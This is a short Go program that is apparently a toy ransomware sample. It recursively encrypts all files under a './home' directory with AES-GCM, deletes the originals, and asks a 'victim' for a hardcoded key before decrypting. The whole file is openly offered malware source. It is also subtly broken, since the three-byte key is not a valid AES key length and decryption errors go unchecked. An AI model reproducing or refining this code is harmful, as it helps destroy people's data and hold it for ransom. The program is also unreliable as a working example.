package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"io"
	"crypto/rand"
)

func encryptFiles(gcm cipher.AEAD) {
	// Loop through target files and encrypt them
	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
		// Skip if it's a directory
		if !info.IsDir() {
			// Encrypt the file
			fmt.Println("Encrypting " + path + "...")

			// Read file contents
			original, err := os.ReadFile(path)
			if err == nil {
				// Encrypt bytes
				nonce := make([]byte, gcm.NonceSize())
				io.ReadFull(rand.Reader, nonce)
				encrypted := gcm.Seal(nonce, nonce, original, nil)

				// Write encrypted contents
				err = os.WriteFile(path + ".enc", encrypted, 0666)
				if err == nil {
					os.Remove(path) // Delete the original file
				} else {
					fmt.Println("Error while writing contents")
				}
			} else {
				fmt.Println("Error while reading file contents")
			}
		}
		return nil
	})
}

func decryptFiles(gcm cipher.AEAD) {
	// Loop through target encrypted files and decrypt them
	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
		// Skip if it's a directory or not an encrypted file
		if !info.IsDir() && path[len(path)-4:] == ".enc" {
			// Decrypt the file
			fmt.Println("Decrypting " + path + "...")

			// Read file contents
			encrypted, err := os.ReadFile(path)
			if err == nil {
				// Decrypt bytes
				nonce := encrypted[:gcm.NonceSize()]
				encrypted = encrypted[gcm.NonceSize():]
				original, err := gcm.Open(nil, nonce, encrypted, nil)

				// Write decrypted contents
				err = os.WriteFile(path[:len(path)-4], original, 0666)
				if err == nil {
					os.Remove(path) // Delete the encrypted file
				} else {
					fmt.Println("Error while writing contents")
				}
			} else {
				fmt.Println("Error while reading file contents")
			}
		}
		return nil
	})
}

func main() {
	// Set the hardcoded key to "123" for encryption and decryption
	key := []byte("123")

	// Initialize AES in GCM mode
	block, err := aes.NewCipher(key)
	if err != nil {
		panic("Error while setting up AES")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("Error while setting up GCM")
	}

	// Encrypt files automatically
	fmt.Println("Encrypting files...")
	encryptFiles(gcm)

	// Simulate the victim entering the correct key (here we hardcode it for simplicity)
	// In a real-world scenario, you would prompt the victim to input the key
	fmt.Println("Enter decryption key: ")
	var inputKey string
	fmt.Scanln(&inputKey)

	// Validate the entered key
	if inputKey != "123" {
		fmt.Println("Invalid key! Decryption failed.")
		return
	}

	// If the correct key is entered, decrypt the files
	fmt.Println("Decrypting files...")
	decryptFiles(gcm)
}
